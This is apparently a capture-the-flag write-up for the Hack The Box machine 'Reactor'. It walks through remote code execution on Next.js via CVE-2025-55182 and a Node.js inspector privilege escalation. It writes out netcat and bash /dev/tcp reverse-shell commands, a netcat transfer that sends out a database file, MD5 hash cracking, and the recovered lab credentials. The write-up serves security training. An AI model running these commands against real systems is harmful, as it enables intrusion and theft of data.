# Hack The Box — Reactor

Difficulty: Easy

OS: Linux

## 1. Enumeration

Initial port scan with `rustscan`:

```bash
rustscan -a 10.129.23.57 -- -sV -sC -oN nmap
```

Discovered ports:

```text
22/tcp   OpenSSH 9.6p1 Ubuntu
3000/tcp Next.js (HTTP)
```

## 2. Web Enumeration

Browsing to `http://10.129.23.57:3000` revealed a Next.js web application.

<img width="2552" height="1245" alt="Pasted image 20260811105430" src="https://github.com/user-attachments/assets/88557b7e-ebaa-408c-b892-ccf08230a81d" />


<img width="492" height="538" alt="Pasted image 20260811105417" src="https://github.com/user-attachments/assets/7d6b23aa-959b-40a7-9b2c-ab248116afd0" />

Using Wappalyzer, the version was identified as:

```text
Next.js 15.0.3
```

This version is vulnerable to CVE-2025-55182, which affects:

- React 19.0.0 through 19.2.1
    
- Next.js 13.x through 16.x

### Vulnerability Summary

CVE-2025-55182 is a Remote Code Execution (RCE) vulnerability in React Server Functions, stemming from prototype chain access and improper thenable handling. An attacker can exploit this by sending a crafted `Next-Action` header along with malicious form data, allowing arbitrary JavaScript code execution on the server.

## 3. Initial Access — CVE-2025-55182

A public exploit was available:

[https://github.com/msanft/CVE-2025-55182/blob/main/poc.py](https://github.com/msanft/CVE-2025-55182/blob/main/poc.py)

```
python3 poc.py http://10.129.23.57:3000 "id"
```

Output:

```text
uid=999(node) gid=999(node) groups=999(node)
```

RCE confirmed as user `node`.

### Reverse Shell

Listener on attacker machine:

```bash
nc -lvnp 4444
```

Trigger reverse shell:

```bash
python3 poc.py --url http://10.129.23.57:3000 "busybox nc 10.10.15.167 4444 -e sh"
```

Result — Shell as `node`:

<img width="538" height="257" alt="image" src="https://github.com/user-attachments/assets/b5182c26-e60f-441f-8a7d-a601c519ec98" />


## 4. Lateral Movement — SQLite Credential Extraction

### File Discovery

Inside the application directory:

<img width="562" height="43" alt="Pasted image 20260811105737" src="https://github.com/user-attachments/assets/815d6cb3-ae3f-4d1f-aaac-ef6f7f4a447a" />

Key files identified:

```text
reactor.db
```

### Extract Database

On attacker:

```bash
nc -lvnp 4444 > reactor.db
```

On victim:

```bash
nc 10.10.15.167 4444 < /opt/reactor-app/reactor.db
```

### Analyze Database

```bash
sqlite3 reactor.db
.tables
SELECT * FROM users;
```

Output:

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### Crack Hash

The `engineer` hash was an MD5 hash:

```bash
hashcat -m 0 '39d97110eafe2a9a68639812cd271e8e' /usr/share/wordlists/rockyou.txt
```

Cracked password:

```text
engineer:reactor1
```

<img width="296" height="17" alt="Pasted image 20260810210610" src="https://github.com/user-attachments/assets/0d2bb2e2-6ce6-4cdf-804f-d468213df049" />

## 5. SSH Access as `engineer`

```bash
ssh engineer@10.129.23.57
Password: reactor1
```

User flag retrieved:

```bash
cat /home/engineer/user.txt
```

<img width="576" height="329" alt="image" src="https://github.com/user-attachments/assets/d63ed352-9f9d-48ec-951a-2400ad3479f7" />

## 6. Privilege Escalation — Node.js Inspector

### Internal Port Scan

From the `engineer` session:

```bash
ss -tulnp
```

Key finding:

```text
tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

Port 9229 — the Node.js Inspector — was listening locally.

<img width="145" height="98" alt="Pasted image 20260811105942" src="https://github.com/user-attachments/assets/9c376d18-6ee1-41c8-9f18-deb781312188" />

### Vulnerability: Node.js Inspector

Node.js Inspector is a debugging feature enabled by the `--inspect` flag, which opens a WebSocket interface on port 9229. Anyone who can connect to this port can execute arbitrary JavaScript code within the Node.js process. In this box, we discovered a root-owned process listening on `127.0.0.1:9229` and used SSH port forwarding to expose it locally. By connecting through Chrome DevTools (`chrome://inspect`), we executed a reverse shell payload via `require('child_process').execSync()` and obtained a root shell.

<img width="973" height="15" alt="Pasted image 20260811110143" src="https://github.com/user-attachments/assets/88c335a1-7fcc-41ef-afaf-3093b7ed61c0" />

Reference: [HackTricks - Node Inspector Abuse](https://hacktricks.wiki/en/linux-hardening/software-information/electron-cef-chromium-debugger-abuse.html)

### SSH Port Forwarding

Since the debug port was only bound to localhost, an SSH tunnel was created:

```bash
ssh -L 9229:127.0.0.1:9229 engineer@10.129.23.57
```

### Connect via Chrome DevTools

1. Open Chrome and navigate to `chrome://inspect`
    
2. Click `Configure` and add `localhost:9229`
    
3. The Node.js target appears — click `inspect`
    

<img width="1303" height="686" alt="image" src="https://github.com/user-attachments/assets/2a836e47-7332-47ab-a590-cae805c2b7e5" />

### Execute Reverse Shell

In the DevTools Console, execute:

```javascript
require('child_process').execSync('/bin/bash -c "bash -i >& /dev/tcp/10.10.15.167/4444 0>&1"', {stdio: 'inherit'});
```

<img width="767" height="417" alt="image" src="https://github.com/user-attachments/assets/397d277c-7441-401b-a097-580a0092911c" />


Result — Root shell obtained:

<img width="560" height="148" alt="Pasted image 20260811104418" src="https://github.com/user-attachments/assets/a1ea2b72-d308-401c-b20a-f2749033a049" />

```bash
cat /root/root.txt
```

<img width="246" height="47" alt="image" src="https://github.com/user-attachments/assets/4f8e3d27-f1cc-4a31-9ffc-d0407cbe6688" />


Root obtained.
